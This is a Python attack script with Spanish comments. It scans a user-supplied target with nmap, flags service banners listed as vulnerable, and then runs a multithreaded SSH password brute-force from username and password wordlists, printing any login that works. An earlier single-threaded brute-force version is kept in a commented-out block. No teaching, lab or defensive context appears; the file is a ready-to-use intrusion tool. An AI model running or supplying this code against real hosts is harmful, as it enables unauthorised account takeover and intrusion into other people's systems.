import nmap
import paramiko, sys, os, termcolor
import threading, time

def scan(target):
    nm = nmap.PortScanner()
    nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')  # Escaneo de todos los puertos con detección de versiones
    
    with open('vulbanners.txt', 'r') as file:
        #vul_banners = file.read().splitlines()
        vul_banners = [line.strip() for line in file.readlines()]
    
    for host in nm.all_hosts():
        print('\n' + '[-_0 Scanning target] ' + str(host))
        for proto in nm[host].all_protocols():
            print('Protocolo : %s' % proto)
            ports = nm[host][proto].keys()
            for port in ports:
                product_version = nm[host][proto][port]['product'] + ' ' + nm[host][proto][port]['version']
                print('[+] Puerto abierto ' + str(port) + ' : ' + product_version)
                if product_version in vul_banners:
                    print(termcolor.colored(('[!!] VULNERABLE BANNER: "' + product_version + '" ON PORT: ' + str(port)),'red'))
                    
targets = input('Escriba el dominio o ip a escanear: ')
if ',' in targets:
    for ip_add in targets.split(','):
        scan(ip_add.strip(' '))
else:
    scan(targets)
    
"""
def ssh_connect(password, code=0):

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(targets, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1

    except socket.error as e:
        code = 2
 
    ssh.close()
    return code


# host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = "passwords.txt"
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ' , For Account: ' + username), 'green'))
                break

            elif response == 1:
                print('[-] Incorrect Login: ' + password)

            elif response == 2:
                print('[!!] Cant Connect')
                sys.exit(1)

        except Exception as e:
            print(e)
            pass         
"""
stop_flag = False
max_threads = 5  # Número máximo de hilos simultáneos
thread_limiter = threading.BoundedSemaphore(max_threads)

def ssh_connect(username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = True
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
    except paramiko.ssh_exception.AuthenticationException:
        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
    except paramiko.ssh_exception.SSHException as e:
        print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
    except Exception as e:
        print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
    finally:
        ssh.close()
        thread_limiter.release()

host = targets
usernames_file = "usernamesReal.txt"
passwords_file = "passwordsReal.txt"
print('\n')

if os.path.exists(passwords_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('Empezando fuerza bruta en host ' + host + ' con el usuario: ' + usernames_file ) 

with open(usernames_file, 'r') as users:
    for username in users:
        username = username.strip()
        with open(passwords_file, 'r') as passwords:
            for password in passwords:
                password = password.strip()
                if stop_flag:
                    break
                thread_limiter.acquire()
                t = threading.Thread(target=ssh_connect, args=(username, password))
                t.start()
                time.sleep(0.5)  # Ajusta el tiempo de espera según sea necesario
                if stop_flag:
                    break
        if stop_flag:
            break

